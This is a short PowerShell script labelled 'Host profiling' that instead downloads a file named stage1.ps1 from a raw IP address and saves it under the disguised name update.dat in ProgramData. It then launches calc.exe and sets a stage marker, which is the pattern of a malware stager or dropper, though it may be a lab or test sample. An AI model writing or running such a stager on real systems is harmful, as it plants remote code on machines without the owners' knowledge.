<# Host profiling #>
[CmdletBinding()]
param(
    [string]$RemoteUrl = "http://198.51.100.176/stage1.ps1",
    [string]$WorkingPath = "C:\ProgramData\update.dat",
    [int]$StageTimeout = 14
)
Invoke-WebRequest -Uri $RemoteUrl -OutFile $WorkingPath -UseBasicParsing
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-19"
Set-Location -Path $env:TEMP
